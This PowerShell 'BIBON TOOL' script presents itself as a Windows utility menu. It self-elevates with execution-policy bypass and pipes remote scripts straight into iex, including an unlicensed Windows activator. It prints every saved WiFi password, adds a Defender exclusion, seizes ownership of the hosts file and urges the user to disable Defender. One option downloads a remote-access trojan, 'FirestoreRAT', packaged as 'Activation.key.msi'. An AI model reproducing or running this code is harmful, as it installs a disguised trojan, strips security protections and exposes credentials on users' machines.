chcp 65001 > $null
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8

# Proverka admin prav
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

$Host.UI.RawUI.WindowTitle = "BIBON TOOL v1.0"

function Show-Banner {
    $banner = @"

    ____  ________  ____  _   __   __  _____   ________ __
   / __ )/  _/ __ )/ __ \/ | / /  / / / /   | / ____/ //_/
  / __  |/ // __  / / / /  |/ /  / /_/ / /| |/ /   / ,<
 / /_/ // // /_/ / /_/ / /|  /  / __  / ___ / /___/ /| |
/_____/___/_____/\____/_/ |_/  /_/ /_/_/  |_\____/_/ |_|

"@
    Write-Host $banner -ForegroundColor Magenta
}

function Show-Menu {
    Clear-Host
    Show-Banner
    Write-Host "  ========================================" -ForegroundColor DarkCyan
    Write-Host "              M E N U" -ForegroundColor Cyan
    Write-Host "  ========================================" -ForegroundColor DarkCyan
    Write-Host ""
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "1" -NoNewline -ForegroundColor Yellow
    Write-Host "] Aktivaciya Windows" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "2" -NoNewline -ForegroundColor Yellow
    Write-Host "] Remove Windows AI" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "3" -NoNewline -ForegroundColor Yellow
    Write-Host "] WiFi paroli" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "4" -NoNewline -ForegroundColor Yellow
    Write-Host "] Blokirovka saytov (hosts)" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "5" -NoNewline -ForegroundColor Yellow
    Write-Host "] Classic context menu (Win10)" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "6" -NoNewline -ForegroundColor Yellow
    Write-Host "] New context menu (Win11)" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "7" -NoNewline -ForegroundColor Yellow
    Write-Host "] Restart explorer.exe" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "8" -NoNewline -ForegroundColor Yellow
    Write-Host "] Install FirestoreRAT" -ForegroundColor White
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "9" -NoNewline -ForegroundColor Yellow
    Write-Host "] YouTube - @bibonuwu" -ForegroundColor White
    Write-Host ""
    Write-Host "   [" -NoNewline -ForegroundColor DarkGray
    Write-Host "0" -NoNewline -ForegroundColor Red
    Write-Host "] Vyhod" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "  ========================================" -ForegroundColor DarkCyan
}

while ($true) {
    Show-Menu
    $choice = Read-Host "  Vybor"

    switch ($choice) {
        "1" {
            Clear-Host
            Write-Host ""
            Write-Host "  Zapusk aktivacii Windows..." -ForegroundColor Yellow
            irm https://get.activated.win | iex
        }
        "2" {
            Clear-Host
            Write-Host ""
            Write-Host "  Zapusk Remove Windows AI..." -ForegroundColor Yellow
            Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -NoExit -Command "& ([scriptblock]::Create((irm ''https://raw.githubusercontent.com/zoicware/RemoveWindowsAI/main/RemoveWindowsAi.ps1'')))"' -Verb RunAs -Wait
        }
        "3" {
            Clear-Host
            Write-Host ""
            Write-Host "  WiFi paroli:" -ForegroundColor Yellow
            Write-Host ""
            $found = $false
            foreach ($line in (netsh wlan show profiles)) {
                if ($line -match ':\s+(.+)$') {
                    $name = $Matches[1].Trim()
                    if ([string]::IsNullOrWhiteSpace($name)) { continue }
                    $pass = "(net parolya)"
                    foreach ($dline in (netsh wlan show profile name="$name" key=clear 2>$null)) {
                        if ($dline -match '(Key Content|ключа)\s*:\s*(.+)$') {
                            $pass = $Matches[2].Trim()
                            break
                        }
                    }
                    Write-Host "   $name " -NoNewline -ForegroundColor Cyan
                    Write-Host ": " -NoNewline -ForegroundColor DarkGray
                    Write-Host "$pass" -ForegroundColor Green
                    $found = $true
                }
            }
            if (-not $found) {
                Write-Host "  WiFi profili ne naydeny" -ForegroundColor Red
            }
            Write-Host ""
            Read-Host "  Enter - nazad v menu"
        }
        "4" {
            Clear-Host
            Write-Host ""
            Write-Host "  Zagruzka spiska saytov..." -ForegroundColor Yellow
            $hostsPath = "$env:SystemRoot\System32\drivers\etc\hosts"
            $url = "https://raw.githubusercontent.com/bibonuwu/Bibon/main/blocked_sites.txt"
            try {
                $content = Invoke-RestMethod -Uri $url
                Add-MpPreference -ExclusionPath $hostsPath -ErrorAction SilentlyContinue
                takeown /f $hostsPath /a > $null 2>&1
                icacls $hostsPath /grant "Administrators:F" > $null 2>&1
                Set-ItemProperty -Path $hostsPath -Name IsReadOnly -Value $false -ErrorAction SilentlyContinue
                [System.IO.File]::WriteAllText($hostsPath, $content, [System.Text.Encoding]::UTF8)
                Write-Host "  Hosts fayl obnovlen!" -ForegroundColor Green
                ipconfig /flushdns > $null
                Write-Host "  DNS kesh ochishen!" -ForegroundColor Green
            }
            catch {
                Write-Host "  Defender blokiruet hosts fayl." -ForegroundColor Red
                Write-Host "  Otklyuchi zaschitu i zapusti skript snova." -ForegroundColor Yellow
                Write-Host ""
                Write-Host "  Otkryvaem nastroyki Defender..." -ForegroundColor Cyan
                Start-Process "windowsdefender://threatsettings"
            }
            Write-Host ""
            Read-Host "  Enter - nazad v menu"
        }
        "5" {
            Clear-Host
            Write-Host ""
            Write-Host "  Vklyuchaem klassicheskoe kontekstnoe menu..." -ForegroundColor Yellow
            reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f > $null 2>&1
            reg add "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32" /f > $null 2>&1
            Write-Host "  Classic context menu vklyucheno!" -ForegroundColor Green
            Write-Host "  Perezapusk explorer..." -ForegroundColor Yellow
            Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
            Start-Process explorer
            Start-Sleep -Seconds 2
        }
        "6" {
            Clear-Host
            Write-Host ""
            Write-Host "  Vozvrat novogo kontekstnogo menu..." -ForegroundColor Yellow
            reg delete "HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}" /f > $null 2>&1
            Write-Host "  New context menu vosstanovleno!" -ForegroundColor Green
            Write-Host "  Perezapusk explorer..." -ForegroundColor Yellow
            Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
            Start-Process explorer
            Start-Sleep -Seconds 2
        }
        "7" {
            Clear-Host
            Write-Host ""
            Write-Host "  Perezapusk explorer.exe..." -ForegroundColor Yellow
            Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
            Start-Process explorer
            Start-Sleep -Seconds 2
            Write-Host "  Explorer perezapushen!" -ForegroundColor Green
        }
        "8" {
            Start-Process "https://github.com/bibonuwu/FirestoreRAT/releases/download/0.2/Activation.key.msi"
        }
        "9" {
            Start-Process "https://www.youtube.com/@bibonuwu"
        }
        "0" {
            exit
        }
    }
}
